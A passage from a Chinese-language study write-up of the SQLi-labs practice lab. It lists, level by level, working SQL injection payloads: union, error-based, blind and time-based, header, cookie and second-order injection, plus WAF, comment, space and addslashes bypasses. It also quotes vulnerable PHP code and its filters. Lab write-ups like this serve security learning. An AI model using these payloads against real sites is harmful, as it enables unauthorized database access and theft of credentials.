7 GET - Dump into outfile - String </strong> <br><br>  文件导入限制条件多，未成功</p>\n</li>\n<li><p><strong> less 8 GET - Blind - Boolian Based - Single Quotes </strong> <br><br>  ?id=-1%27or%201%3d1%23 <br><br>  利用二分与返回结果的正确与否，来猜测验证数据库内容</p>\n</li>\n<li><p><strong> less 9 GET - Blind - Time Based - Single Quotes </strong> <br><br>  ?id=1%27%20and%20if(ascii(substr(database(),1,1))&gt;116,%200,%20sleep(5))%20%23 <br><br>  因为在这正确或者错误都是返回的”you are in” 所以不能区分 <br><br><img src=\"./youarein.png\" alt=\"youarein\"><br>  使用时间延迟，例子为判断数据库名字第一个字是否为s(ascii码为115)，要进行多次尝试</p>\n</li>\n<li><p><strong> less 10 GET -Blind - Time Based - Double Quotes </strong> <br><br>  ?id=1”%20and%20if(ascii(substr(database(),1,1))&gt;116,%200,%20sleep(5))%20%23</p>\n</li>\n<li><p><strong> less 11 POST - Error Based -Single Qoutes - String </strong> <br><br>  username:  </p>\n<pre><code>1.admin &apos; # admin用户&lt;/br&gt;\n2.adimn &apos; or 1=1 # 万能&lt;/br&gt;\n3. &apos; union select version(),1 # 等其它操作\n</code></pre><p>  passwd:<br>  因为username已经用#将后面注释了，所以passwd随意输入</p>\n</li>\n<li><p><strong> less 12 POST - Error Based - Double Quotes - String - with twist </strong> <br><br>将less11的单引号改为 “）</p>\n</li>\n<li><p><strong> less 13 POST - Double Injection - Single quotes - String - with twist </strong> <br><br>  username:    ‘) union select (select count(*) from information_schema.schemata group by concat(version(),floor(rand(0)*2))),1 #<br><br>  返回信息Duplicate entry ‘5.7.23-0ubuntu0.16.04.11’ for key ‘’<br><br>  另外这种有正确/错误提示的，都可以二分盲注来猜测验证</p>\n</li>\n<li><p><strong> less 14 POST  - Double Injection - Double quotes - String </strong> <br><br>  less13 ‘) 换为 ”</p>\n</li>\n<li><p><strong> less 15 POST - Blind - Boolean/Time Based -Single Quotes </strong> <br><br>  username: ‘ or 1=1 # 登录成功 <br><br>  思路：利用or/and/if sleep()等来进行猜测<br></p>\n</li>\n<li><p><strong> less 16 POST - Blind - Boolean/Time Based - Double Quotes - with twist </strong> <br><br>  将less15 ‘ 换成 “)</p>\n</li>\n<li><p><strong> less 17 POST - Update Query - Error Based - String </strong> <br><br>  这里对用户名进行了过滤<br><br>  利用报错进行注入输出 <br><br>  uname=admin&amp;passwd=11’and extractvalue(1,concat(0x7e,(select @@version),0x7e))#&amp;sub mit=Submit <br><br>  输出结果XPATH syntax error: ‘~5.7.23-0ubuntu0.16.04.1~’<br><br>报错注入基本都是利用XPath进行报错<br>  有必要去买本书来系统的看一下mysql各种函数</p>\n</li>\n<li><p><strong> less 18 POST - Header Injection - Uagent field - Error Based </strong> <br><br>  这里需要正确的账号密码才能进行注入，因为插入操作是在登录判断成功后<br><br>  php中语句：$insert=”INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (‘$uagent’, ‘$IP’, $uname)”;<br>其中$IP不好修改，$uname与$password进行了过滤，所以考虑$uagent<br><br>  将User-Agent 修改为 ‘ or extractvalue(1,concat(0x7e,version())) or ’<br><br>  返回结果：XPATH syntax error: ‘~5.7.23-0ubuntu0.16.04.1’</p>\n</li>\n<li><p><strong> less 19 POST - Header Injection - Referer Field - Error Based </strong> <br><br>  同less 18,进行了过滤，但执行了$insert=”INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (‘$uagent’, ‘$IP’)”;<br><br>  其中：$uagent = $_SERVER[‘HTTP_REFERER’];<br><br>  将Referer 修改为: ‘or extractvalue(1,concat(0x7e,database())) or’<br><br>  返回: XPATH syntax error: ‘~security’</p>\n</li>\n<li><p><strong> less 20 POST - Cookie Injection - Uagent Field - Error Based </strong> <br><br>  进行了过滤<br><br>  $cookee = $_COOKIE[‘uname’];<br><br>  $sql=”SELECT * FROM users WHERE username=’$cookee’ LIMIT 0,1”;<br><br>  流程是登录成功后产生cookie,此时修改cookie,进行注入(在chrome浏览器中使用tamper插件进行请求的拦截修改)<br><br>  修改Cookie为： uname=-1’ union select 1,(select version()),3 #<br><br>  返回 ：</p>\n<pre><code>Your Login name:5.7.23-0ubuntu0.16.04.1\nYour Password:3\nYour ID:1\n</code></pre><p>  也可以用MYSQL对XML文档数据进行查询和修改的XPATH函数，进行报错回显<br><br>   uname=admin’and extractvalue(1,concat(0x7e,(select @@basedir),0x7e))# <br><br>  返回:Issue with your mysql: XPATH syntax error: ‘~/usr/~’</p>\n</li>\n<li><p><strong> less 21 POST - Cookie Injection - Error Based - Base64 Encode - Single Quotes - String </strong> <br><br>  setcookie(‘uname’, base64_encode($row1[‘username’]), time()+3600);<br>  $sql=”SELECT * FROM users WHERE username=(‘$cookee’) LIMIT 0,1”;<br><br>  对Cookie 进行了 base64处理 <br><br>  uname=LTEnKSB1bmlvbiBzZWxlY3QgMSwoc2VsZWN0IHZlcnNpb24oKSksMyAj<br>  uname=-1’) union select 1,(select version()),3 #<br><br>  返回：<br><br>Your Login name:5.7.23-0ubuntu0.16.04.1<br><br>   Your Password:3<br><br>  Your ID:1</p>\n</li>\n<li><p><strong> less 22 POST - Cookie Injection - Error Based - Base64 Encode - Double Quotes - String </strong> <br><br>  对Cookie进行了base64编码，使用的双引号</p>\n</li>\n</ul>\n<hr>\n<ul>\n<li><p><strong> less 23 GET - Error Based - Strip Comments </strong> <br><br>  php中处理：<br><br>  $reg = “/#/“;<br><br>  $reg1 = “/–/“;<br><br>  $replace = “”;<br><br>  $id = preg_replace($reg, $replace, $id); //将$reg替换为$replace<br><br>  $id = preg_replace($reg1, $replace, $id);<br><br>  $sql=”SELECT * FROM users WHERE id=’$id’ LIMIT 0,1”;<br><br>  因为过滤了注释符号，所以自己添加引号来闭合,同样可以使用报错/延时注入等<br><br>  ?id=-1%27%20union%20select%201%2c(select%20version())%2c3%20%27<br><br>  返回：<br><br>Your Login name:5.7.23-0ubuntu0.16.04.1<br><br>  Your Password:3</p>\n</li>\n<li><p><strong> less 24 POST - Second Order Injection *Real treat* - Stored Injections </strong> <br><br>  本关为二次注入的示范例。二次注入也称为存储型的注入，就是将可能导致 sql 注入的字符先存入到数据库中， 当再次调用这个恶意构造的字符时， 就可以触发 sql 注入<br><br>  php中:<br></p>\n<pre><code>$sql = &quot;select count(\\*) from users where username=&apos;$username&apos;&quot;;\n    $res = mysql_query($sql) or die(&apos;You tried to be smart, Try harder!!!! :( &apos;);\n    $sql = &quot;insert into users ( username, password) values(\\&quot;$username\\&quot;, \\&quot;$pass\\&quot;)&quot;;\n    $sql = &quot;UPDATE users SET PASSWORD=&apos;$pass&apos; where username=&apos;$username&apos; and password=&apos;$curr_pass&apos; &quot;;\n</code></pre><p>  先注册一个admin’#用户，更改其密码，实际上是更改的admin的密码</p>\n</li>\n<li><p><strong>less 25 GET - Error Based - All your OR &amp; AND Belong to us - String - Single Quotes</strong><br><br>  $id= preg_replace(‘/or/i’,””, $id);            //strip out OR (non case sensitive)<br><br>  $id= preg_replace(‘/AND/i’,””, $id);        //Strip out AND (non case sensitive)<br><br>  $sql=”SELECT * FROM users WHERE id=’$id’ LIMIT 0,1”;<br><br>  思路：使用union<br>  绕过过滤：</p>\n<pre><code>（1）大小写变形 Or,OR,oR\n（2）编码，hex，urlencode\n（3）添加注释/*or*/\n（4）利用符号 and=&amp;&amp; or=||\n</code></pre><p>  ?id=1%27%20||%20%20extractvalue(1%2cconcat(0x7e%2cversion()))%23<br>  返回：XPATH syntax error: ‘~5.7.23-0ubuntu0.16.04.1’</p>\n</li>\n<li><p><strong>less 25a GET - Blind Based - All your OR &amp; AND Belong to us - String - Single Quotes</strong> <br><br>  $id= blacklist($id);<br><br>  $sql=”SELECT * FROM users WHERE id=$id LIMIT 0,1”;<br><br>  //print_r(mysql_error()); <br><br>  报错注入不能用，所以使用基于布尔的注入，其中and/or进行了过滤<br><br>  ?id=-1%20||%20if(ascii(substr(database(),1,1))%3d117,0,1)判断数据库名字第一个字符是不是u(users库)<br><br>然后依次这样，查出数据库名</p>\n</li>\n<li><p><strong>less 26 GETs - Error Based - All your Spaces and Comments Belong to us</strong> <br><br>  Comments 注释<br><br>  php中:<br></p>\n<pre><code>function blacklist($id)\n {\n $id= preg_replace(&apos;/or/i&apos;,&quot;&quot;, $id);            //strip out OR (non case sensitive)\n $id= preg_replace(&apos;/and/i&apos;,&quot;&quot;, $id);        //Strip out AND (non case sensitive)\n $id= preg_replace(&apos;/[\\/\\*]/&apos;,&quot;&quot;, $id);        //strip out /*\n $id= preg_replace(&apos;/[--]/&apos;,&quot;&quot;, $id);        //Strip out --\n $id= preg_replace(&apos;/[#]/&apos;,&quot;&quot;, $id);            //Strip out #\n $id= preg_replace(&apos;/[\\s]/&apos;,&quot;&quot;, $id);        //Strip out spaces\n $id= preg_replace(&apos;/[\\/\\\\\\\\]/&apos;,&quot;&quot;, $id);        //Strip out slashes\n return $id;\n}\n</code></pre><p>  $sql=”SELECT * FROM users WHERE id=’$id’ LIMIT 0,1”;<br><br>  思路：<br><br>注释过滤了可以手动闭合引号，空格过滤<br>  可以使用  %a0  换行，<br><br>/**/ 注释， （） 括号等绕过空格<br><br>  此处注释不能使用，为了使用select时去掉末尾引号，空格也不行<br><br>  id=’111’union(select(1),(version()),(3)） ‘ LIMIT 0,1; 使用括号时，引号还在<br><br>  ?id=111%27union%a0select%a01%2cversion()%2c3||%271使用换行成功</p>\n</li>\n<li><p><strong>less 26a  GET - Blind Based - All your SPACES And COMMENTS Belong to us - Quotes-Parenthesis</strong> <br><br>  过滤和less26相同<br><br>  $sql=”SELECT * FROM users WHERE id=(‘$id’) LIMIT 0,1”;<br><br>  ?id=111%27)union%a0select%a01%2cversion()%2c3||(%271<br></p>\n<p>  思考：在盲注时，我们不知道进行了哪些过滤，可以构造特殊payload,如果返回原结果，则说明是我们所猜测的 %26为&amp;<br><br>  ?id=1%27%26%26%271=1 猜测为’ ‘<br><br>  ?id=1%27)%26%26(%271=1 猜测为（’ ‘）<br><br>  ?id=1%22%26%26%221=1 猜测为 “ “<br><br>  ?id=1%22)%26%26(%221=1 猜测为(“ “)<br><br>  ?id=1)%26%26(1=1  猜测为()<br><br>  ?id=1%26%261=1 无<br><br>等诸如此类<br></p>\n</li>\n<li><p><strong>less 27 GET - Error Based - All your UNION &amp; SELECT Belong to us - String - Single Quotes</strong><br></p>\n<pre><code>function blacklist($id)\n{\n$id= preg_replace(&apos;/[\\/\\*]/&apos;,&quot;&quot;, $id);        //strip out /*\n$id= preg_replace(&apos;/[--]/&apos;,&quot;&quot;, $id);        //Strip out --.\n$id= preg_replace(&apos;/[#]/&apos;,&quot;&quot;, $id);            //Strip out #.\n$id= preg_replace(&apos;/[ +]/&apos;,&quot;&quot;, $id);        //Strip out spaces.\n$id= preg_replace(&apos;/select/m&apos;,&quot;&quot;, $id);        //Strip out spaces.\n$id= preg_replace(&apos;/[ +]/&apos;,&quot;&quot;, $id);        //Strip out spaces.\n$id= preg_replace(&apos;/union/s&apos;,&quot;&quot;, $id);        //Strip out union\n$id= preg_replace(&apos;/select/s&apos;,&quot;&quot;, $id);        //Strip out select\n$id= preg_replace(&apos;/UNION/s&apos;,&quot;&quot;, $id);        //Strip out UNION\n$id= preg_replace(&apos;/SELECT/s&apos;,&quot;&quot;, $id);        //Strip out SELECT\n$id= preg_replace(&apos;/Union/s&apos;,&quot;&quot;, $id);        //Strip out Union\n$id= preg_replace(&apos;/Select/s&apos;,&quot;&quot;, $id);        //Strip out select\nreturn $id;\n}\n</code></pre><p>  $sql=”SELECT * FROM users WHERE id=’$id’ LIMIT 0,1”;<br></p>\n<p>  思路一：大小写绕过<br><br>  ?id=111%27%a0uNioN%a0sElEct%a01,version(),3%a0%27<br><br>  思路二：报错或延时？</p>\n</li>\n<li><p><strong>less 27a GET - Blind Based - All your UNION &amp; SELECT Belong to us -Double Quotes</strong><br><br>  1.?id=1%22%26%26%221=1 成功，猜测为“ “过滤<br><br>  2.?id=111%22%a0uNioN%a0sElEct%a01,version(),3%a0%22成功注入<br></p>\n</li>\n<li><p><strong>less 28 GET - Error Based - All your UNION &amp; SELECT Belong to us - String - Single Quotes with Parentesis</strong><br></p>\n<pre><code>function blacklist($id)\n{\n$id= preg_replace(&apos;/[\\/\\*]/&apos;,&quot;&quot;, $id);                //strip out /*\n$id= preg_replace(&apos;/[--]/&apos;,&quot;&quot;, $id);                //Strip out --.\n$id= preg_replace(&apos;/[#]/&apos;,&quot;&quot;, $id);                    //Strip out #.\n$id= preg_replace(&apos;/[ +]/&apos;,&quot;&quot;, $id);                //Strip out spaces.\n$id= preg_replace(&apos;/select/m&apos;,&quot;&quot;, $id);                    Strip out spaces.\n$id= preg_replace(&apos;/[ +]/&apos;,&quot;&quot;, $id);                //Strip out spaces.\n$id= preg_replace(&apos;/union\\s+select/i&apos;,&quot;&quot;, $id);        //Strip out UNION &amp; SELECT.\nreturn $id;\n}\n $sql=&quot;SELECT * FROM users WHERE id=(&apos;$id&apos;) LIMIT 0,1&quot;;\n</code></pre><p>  ?id=111%27)%a0uNioN%a0sElEct%a01,version(),3%a0||(%27</p>\n<ul>\n<li><strong>less 28a GET - Error Based - All your UNION &amp; SELECT Belong to us - String - Single Quotes - Parentesis</strong><br><pre><code>function blacklist($id)\n{\n$id= preg_replace(&apos;/union\\s+select/i&apos;,&quot;&quot;, $id);        //Strip out spaces.\nreturn $id;\n}\n$sql=&quot;SELECT * FROM users WHERE id=(&apos;$id&apos;) LIMIT 0,1&quot;;\n</code></pre>?id=111%27)%a0uNioN%a0sElEct%a01,version(),3%a0||(%27   与less28相同</li>\n</ul>\n</li>\n<li><p><strong>less 29 GET Error Based - IMPIDENCE MISMATCH - Having a WAF in Front of Web Application</strong><br><br>服务器（两层架构）<br><br>  当?id=1&amp;id=2， apache（php）解析最后一个参数，即显示 id=2 的内容。Tomcat（jsp）解析第 一个参数，即显示 id=1 的内容<br><br>  此处应该返回id=2 的内容，因为时间上提供服务的是 apache（php）服务器， 返回的数据也应该是 apache 处理的数据。 而在我们实际应用中， 也是有两层服务器的情况， 那为什么要这么做？是因为我们往往在 tomcat 服务器处做数据过滤和处理，功能类似为一 个 WAF。而正因为解析参数的不同，我们此处可以利用该原理绕过 WAF 的检测。该用法就 是 HPP（HTTP Parameter Pollution），http 参数污染攻击的一个应用。HPP 可对服务器和客 户端都能够造成一定的威胁。 <br><br>  ?id=1&amp;id=-2%27union%20select%201,user(),version()%27<br><br>  返回:<br><br>Your Login name:root@localhost<br><br>  Your Password:5.7.23-0ubuntu0.16.04.1</p>\n</li>\n<li><p><strong>less 30 GET Blind - IMPIDENCE MISMATCH - Having a WAF in Front of Web</strong><br><br>  ?id=1&amp;id=-2%22union%20select%201,user(),version()%22</p>\n</li>\n<li><p><strong>less 31 GET Blind - IMPIDENCE MISMATCH - Having a WAF in Front of Web</strong> <br><br>  ?id=1&amp;id=-2”)union%20select%201,user(),version()%23</p>\n</li>\n<li><p><strong>less 32 GET - Bypass Custom Filter Adding Slashes to Dangerous Chars</strong><br><br>宽字节注入<br><br>  原理：mysql 在使用 GBK 编码的时候，会认为两个字符为一个汉字，例如%aa%5c 就是一个 汉字（前一个 ascii 码大于 128 才能到汉字的范围）。我们在过滤 ’ 的时候，往往利用的思 路是将 ‘ 转换为 \\’ （转换的函数或者思路会在每一关遇到的时候介绍）。 因此我们在此想办法将 ‘ 前面添加的 \\ 除掉。<br><br>一般有两种思路： <br><br>  1、%df 吃掉 \\ 具体的原因是 urlencode(‘) = %5c%27，我们在%5c%27 前面添加%df，形 成%df%5c%27， 而上面提到的 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字， 此 事%df%5c 就是一个汉字， %27 则作为一个单独的符号在外面， 同时也就达到了我们的目的。<br><br>  2、将 \\’ 中的 \\ 过滤掉， 例如可以构造 %**%5c%5c%27 的情况， 后面的%5c 会被前面的%5c 给注释掉。这也是 bypass 的一种方法。<br></p>\n<p>  addslashes() 函数返回在预定义字符之前添加反斜杠的字符串，预定义字符为：’   “  \\<br><br>  addslashes()并未将反斜杠一起写入数据库，只是帮助mysql完成了sql语句的执行</p>\n<pre><code>function check_addslashes($string)\n{\n    $string= addslashes($string);    \n    return $string;\n}\n</code></pre><p>  例?id=-1%27%20union%20select%201,version(),user()%20%27<br><br>  The filtered request is :-1\\’ union select 1,version(),user() \\’<br></p>\n<p>  ?id=-1%df%27%20union%20select%201,version(),user()%23<br><br>  返回:<br><br>Your Login name:5.7.23-0ubuntu0.16.04.1<br><br>  Your Password:root@localhost</p>\n</li>\n<li><p><strong>less 33 GET -  Bypass AddSlashers()</strong><br><br>  ?id=-1%df%27%20union%20select%201,version(),user()%23和less32一样</p>\n</li>\n<li><p><strong>less 34 POST - Bypass AddSlashers()</strong><br><br>  post型的方式我们是以url形式 提交的，因此数据会通过URLencode，如何将方法用在post型的注入当中，我们此处介绍 一个新的方法。将utf-8转换为utf-16或utf-32，例如将‘转为utf-16为’ 。我们就 可以利用这个方式进行尝试。<br></p>\n<p>  運’ or 1=1 # 成功，猜测: 在后台運会被解析成%df%5c <br><br>  SELECT username, password FROM users WHERE username=’運\\’ or 1=1# ‘ and password=’’ LIMIT 0,1</p>\n</li>\n<li><p><strong>less 35 GET - Bypass Add Slashes(we dont need them) Integer Based</strong><br><br>  php中：$sql=”SELECT * FROM users WHERE id=$id LIMIT 0,1”;<br><br>  可以看出，不需要构造特殊符号<br><br>  ?id=-1%20union%20select%201,version(),user()%23<br></p>\n</li>\n<li><p><strong>less 36 GET - Bypass mysql_real _escape _string</strong><br><br>  mysql_real_escape_string(string,connection) 转义 SQL 语句中使用的字符串中的特殊字符<br><br>  string 必需，要转义的字符串<br><br>  connection 可选，规定 MySQL 连接。如果未规定，则使用上一个连接<br></p>\n<pre><code>\\x00  ascii码 null\n\\n    换行\n\\r    回车\n\\\n&apos;\n&quot;\n\\x1a （即十进制26）&amp;\n</code></pre><p>  这些字符会被转义<br></p>\n<pre><code>function check_quotes($string)\n{\n    $string= mysql_real_escape_string($string);    \n    return $string;\n}\n$sql=&quot;SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1&quot;;\n</code></pre><p>  ?id=-1%df%27%20union%20select%201,version(),user()%23 成功</p>\n</li>\n<li><p><strong>less 37 POST - Bypass mysql_real_escape_string</strong> <br><br>  運’ or 1=1 #</p>\n</li>\n</ul>\n<hr>\n<p>Stacked injections:堆叠注入。从名词的含义就可以看到应该是一堆 sql 语句（多条）一起执 行。而在真实的运用中也是这样的，我们知道在 mysql 中，主要是命令行中，每一条语句结 尾加 ; 表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做stacked injection。 <br><br>原理:<br><br>在 SQL 中，分号（;）是用来表示一条 sql 语句的结束。试想一下我们在 ; 结束一个 sql 语句后继续构造下一条语句， 会不会一起执行？因此这个想法也就造就了堆叠注入。 而 union injection （联合注入） 也是将两条语句合并在一起， 两者之间有什么区别么？区别就在于 union 或者 union all 执行的语句类型是有限的， 可以用来执行查询语句， 而堆叠注入可以执行的是 任意的语句。 <br><br>局限:<br><br>堆叠注入的局限性在于并不是每一个环境下都可以执行， 可能受到 API 或者数据库引擎 不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。 <br><br>虽然我们前面提到了堆叠查询可以执行任意的 sql 语句，但是这种注入方式并不是十分 的完美的。在我们的 web 系统中，因为代码通常只返回一个查询结果，因此，堆叠注入第 二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的。<br>因此，在读取数据时，我们建议使用 union（联合）注入。同时在使用堆叠注入之前， 我们也是需要知道一些数据库相关信息的，例如表名，列名等信息<br></p>\n<p>暂不深入了解</p>\n<hr>\n<p>challenge</p>\n<ul>\n<li><p><strong>GET - challenge - Union -10 Queries Allowed - Variation1</strong><br><br>  1.查表名<br><br>  ?id=-1%27%20union%20select%201,(select%20table_name%20from%20information_schema.tables%20where%20table_schema%3d%27challenges%27),3%20%23<br><br>  得到此次的表名: 8TELU525VO<br><br>  2.查列名 用concat一次性查完输出<br><br>  ?id=-1%27%20union%20select%201,(select%20group_concat(column_name ,%22—%22)%20from%20information_schema.columns%20where%20table_name%3d%228TELU525VO%22),3%20%23<br><br>  返回:<br><br>Your Login name:id—,sessid—,secret_63JY—,tryy—<br><br>  Your Password:3<br><br>  3.得到密码id,sessid,secret_63JY<br><br>  ?id=-1%27%20union%20select%20id,sessid,secret_63JY%20from%208TELU525VO%20%23<br><br>  返回:<br><br>Your Login name:856213ca887976a33e3d91b2c61fa65a<br><br>  Your Password:M5ztHsC34iN2X0lzCiXJ27Cp<br><br>  4.输入 M5ztHsC34iN2X0lzCiXJ27Cp 完成</p>\n</li>\n<li><p><strong>GET - Challenge - Union - 14 Queries Allowed - Variation 2</strong><br><br>  1.猜测过滤规则<br><br>  当输入?id=1)%26%26(1=1 时 成功 可知过滤为()<br><br>  2.参考less 54<br><br>  ?id=-1)%20union%20select%201,(select%20table_name%20from%20information_schema.tables%20where%20table_schema%3d%27challenges%27),3%20%23<br><br>  表名为: C73JPUKYS9    <br><br>  ?id=-1)%20union%20select%201,(select%20group_concat(column_name ,%22—%22)%20from%20information_schema.columns%20where%20table_name%3d<br>  %22C73JPUKYS9%22),3%20%23<br><br>  列名: Your Login name:id—,sessid—,secret_DH0J—,tryy—<br><br>  ?id=-1)%20union%20select%20id,sessid,secret_DH0J%20from%20C73JPUKYS9%20%23<br><br>  密码：<br><br>Your Login name: 4d0218b33a232f675d53381ef38b5370<br><br>Your Password: kjbKG19I62vmYE3kS7gGN7qf <br> 成功</p>\n</li>\n<li><p><strong>GET - Challenge - Union - 14 Queries Allowed - Variation 3</strong><br><br>  1.猜测<br><br>  ?id=1%27)%26%26(%271=1 成功 可知为(‘ ‘)<br><br>  2.下面步骤如上<br></p>\n</li>\n<li><p><strong>GET - Challenge - Union - 14 Queries Allowed - Variation 4</strong><br><br>  如上</p>\n</li>\n<li><p><strong>GET - Challenge - Double Query -5 Queries Allowed - Variation 1</strong><br><br>  1.猜测<br><br>  ?id=1%27%26%26%271=1 成功，可知为’ ‘<br><br>  ?id=-1%27%20union%20select%201,(select%20table_name%20from%20information_schema.tables%20where%20table_schema%3d%27challenges%27),3%20%23 <br>  返回同上，可知有其它过滤规则<br><br>  尝试报错注入<br><br>  ?id=-1%27%20union%20select%20updatexml(1,concat(0x7e,version(),0x7e),1)%23 成功返回version()<br><br>  2.获取表名<br><br>  ?id=-1%27%20union%20select%201,updatexml(1,concat(0x7e,(select%20table_name%20from%20information_schema.tables%20where%20table_schema%3d%27challenges%27),0x7e),1),1%23<br><br>  返回：XPATH syntax error: ‘~4HT916R6T1~’<br><br>  3.获取列名<br><br>  ?id=-1%27%20union%20select%201,updatexml(1,concat(0x7e,(select%20group_concat(column_name%20,”—“)%20from%20information_schema.columns%20where%20table_name%3d%20”4HT916R6T1”),0x7e),1),1%23<br><br>  返回: XPATH syntax error: ‘~id—,sessid—,secret_EN0R—,’为什么有一个列没显示<br><br>  4.获取密码<br><br>  ?id=-1%27%20union%20select%201,updatexml(1,concat(0x7e,(select%20secret_EN0R%20from%204HT916R6T1),0x7e),1),1%23<br><br>  返回: XPATH syntax error: ‘~OcDGOovBkd3XMq3FpuSNtEIN~’<br></p>\n</li>\n<li><p><strong>GET - Challenge - Double Query -5 Queries Allowed - Variation 2</strong><br><br>  ?id=1%26%261=1 返回成功，说明无字符<br><br>  剩余步骤如 less 58<br></p>\n</li>\n<li><p><strong>GET - Challenge - Double Query -5 Queries Allowed - Variation 3</strong><br> ?id=1%22%26%26%221=1 猜测为 “ “<br><br>?id=1%22)%26%26(%221=1 猜测为(“ “) <br><br>都返回相同结果？？？？<br><br>但实际上</p>\n<pre><code>$id = &apos;(&quot;&apos;.$id.&apos;&quot;)&apos;;\n  $sql=&quot;SELECT * FROM security.users WHERE id=$id LIMIT 0,1&quot;;\n     if($row)\n      {\n          echo &apos;&lt;font color= &quot;#00FFFF&quot;&gt;&apos;;\n          $unames=array(&quot;Dumb&quot;,&quot;Angelina&quot;,&quot;Dummy&quot;,&quot;secure&quot;,&quot;stupid&quot;,&quot;superman&quot;,&quot;batman&quot;,&quot;admin&quot;,&quot;admin1&quot;,&quot;admin2&quot;,&quot;admin3&quot;,&quot;dhakkan&quot;,&quot;admin4&quot;);\n          $pass = array_reverse($unames);\n          echo &apos;Your Login name : &apos;. $unames[$row[&apos;id&apos;]];\n          echo &quot;&lt;br&gt;&quot;;\n          echo &apos;Your Password : &apos; .$pass[$row[&apos;id&apos;]];\n          echo &quot;&lt;/font&gt;&quot;;\n      }\n      else\n      {\n          echo &apos;&lt;font color= &quot;#FFFF00&quot;&gt;&apos;;\n          print_r(mysql_error());\n          echo &quot;&lt;/font&gt;&quot;;  \n      }\n</code></pre><p> 每次返回都是$unames=array（），奸诈！！</p>\n</li>\n<li><p><strong>GET - Challenge - Double Query -5 Queries Allowed - Variation 4</strong><br><br>  $sql=”SELECT * FROM security.users WHERE id=((‘$id’)) LIMIT 0,1”;</p>\n</li>\n<li><p><strong>GET - Challenge - Blind -130 Queries Allowed - Variation 1</strong><br><br>  盲注了,该写脚本了，boolean或者延时,注意使用二分提高效率<br><br>  ?id=1%27)and If(ascii(substr((select group_concat(tabl e_name)%20from%20information_schema.tables%20where%20table_schema=%27challenges%2 7),1,1))=79,0,sleep(10))–+</p>\n</li>\n</ul>\n<h3 id=\"三-杂记\"><a href=\"#三-杂记\" class=\"headerlink\" title=\"三.杂记\"></a>三.杂记</h3><ul>\n<li><p>盲注<br><br>  语句执行完后没有回显<br><br>  1.基于布尔<br><br>  构造条件，有无界面显示来判断自己构造的消息是否正确（相当于猜测再验证，可以利用二分法提高效率）<br><br>  2.基于报错<br><br>  SELECT COUNT(SCHEMA_NAME) FROM information_schema.SCHEMATA GROUP BY CONCAT(VERSION(),FLOOR(RAND(0)*2));<br><br>  [Err] 1062 - Duplicate entry ‘5.7.23-0ubuntu0.16.04.11’ for key ‘&lt;group_key&gt;’<br><br>  具体原理不懂，concat, floor, group by，rand(0)是关键<br><br>  如果rand被禁用可以使用用户变量来报错？？<br><br>  或者XPath报错等<br><br>  3.基于时间-延迟注入<br><br>  利用if,当条件正确或错误时，确定要不要sleep()来猜测<br></p>\n</li>\n<li><p>insert/update/delete注入<br><br>  思路：利用MYSQL对XML文档数据进行查询和修改的XPATH函数，进行报错回显<br></p>\n</li>\n<li><p>order by<br><br>可以用来确定有几列，如 order by 4 ,报错没有第四列<br></p>\n</li>\n<li><p>url编码</p>\n<pre><code>空格    -    %20\n&quot;          -    %22\n#         -    %23\n%        -    %25\n&amp;         -    %26\n(          -    %28\n)          -    %29\n+         -    %2B\n,          -    %2C 逗号\n/          -    %2F\n:          -    %3A\n;          -    %3B\n&lt;         -    %3C\n=         -    %3D\n&gt;         -    %3E\n?         -    %3F\n@       -    %40\n\\          -    %5C\n|          -    %7C\n&apos;               %27  单引号\n</code></pre></li>\n<li><p>补充一些数据库知识<br></p>\n<pre><code>infomation_shema这个数据库中保存了mysql服务器中的所有数据库信息。\n如数据库名，数据库的表，表栏的数据类型与访问权限等。&lt;/br&gt;\n再简单点，这台MySQL服务器上，到底有哪些数据库、各个数据库有哪些表，\n每张表的字段类型是什么，各个数据库要什么权限才能访问，等等信息都保存在information_schema里面。&lt;/br&gt;\n\ninformation_schema的表schemata中的列schema_name记录了所有数据库的名字\ninformation_schema的表tables中的列table_schema记录了所有数据库的名字\ninformation_schema的表tables中的列table_name记录了所有数据库的表的名字\ninformation_schema的表columns中的列table_schema记录了所有数据库的名字\ninformation_schema的表columns中的列table_name记录了所有数据库的表的名字\ninformation_schema的表columns中的列column_name记录了所有数据库的表的列的名字\n</code></pre><p>查询指定数据库所有表名<br><br>SELECT table_name FROM information_schema.tables WHERE table_schema=’数据库名’;<br><br>查询mysql中所有数据库名字<br><br>SELECT schema_name FROM information_schema.schemata<br></p>\n<p>  version()  mysql版本<br>  user()用户<br>  @@datadir数据路径<br>  @@version_compile_os 操作系统<br>  database() 数据库名字<br>  SELECT VERSION(), USER(), @@datadir, @@version_compile_os, DATABASE();<br>–+/# 注释，一般用#，url编码为%23<br><br><br>mysql中XPath:<br><br>MySQL 5.1.5版本中添加了对XML文档进行查询和修改的函数，分别是ExtractValue()和UpdateXML()<br><br>ExtractValue():<br><br>  EXTRACTVALUE (XML_document, XPath_string); <br><br>  第一个参数：XML_document是String格式，为XML文档对象的名称<br><br>  第二个参数：XPath_string (Xpath格式的字符串) <br><br>  作用：从目标XML中返回包含所查询值的字符串<br><br>UpdateXml():<br><br>  UPDATEXML (XML_document, XPath_string, new_value); <br><br>  第一个参数：XML_document是String格式，为XML文档对象的名称<br><br>  第二个参数：XPath_string (Xpath格式的字符串) <br><br>  第三个参数：new_value，String格式，替换查找到的符合条件的数据 <br><br>  作用：改变文档中符合条件的节点的值 <br><br>通常利用其显错来进行注入，例 updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)<br><br>0x7E为~的ascii码<br><br><br>if<br><br>IF(expr1,expr2,expr3) 如果expr1为true返回expr2,否则返回expr3<br><br><br>concat() 连接字符串，将多个连接在一起。<br><br>  concat(str1,str2,…)<br><br>concat_ws() 将多个字符串连接在一起，可以一次性指定分隔符<br><br>  concat_ws(sparator, str1,str2,…)<br><br>group_concat() 将group by产生的同一个分组中的值连接起来，返回一个字符串结果<br><br>  group_concat( [distinct] 要连接的字段 [order by 排序字段 asc/desc  ] [separator ‘分隔符’] )<br></p>\n</li>\n</ul>\n<ul>\n<li><p>问题：<br><br>1.怎么确定是哪种注入类型？<br><br>2.在没有返回值的情况下判断单引号双引号括号等</p>\n</li>\n<li><p>其它</p>\n<pre><code>?id=1%27%26%26%271=1 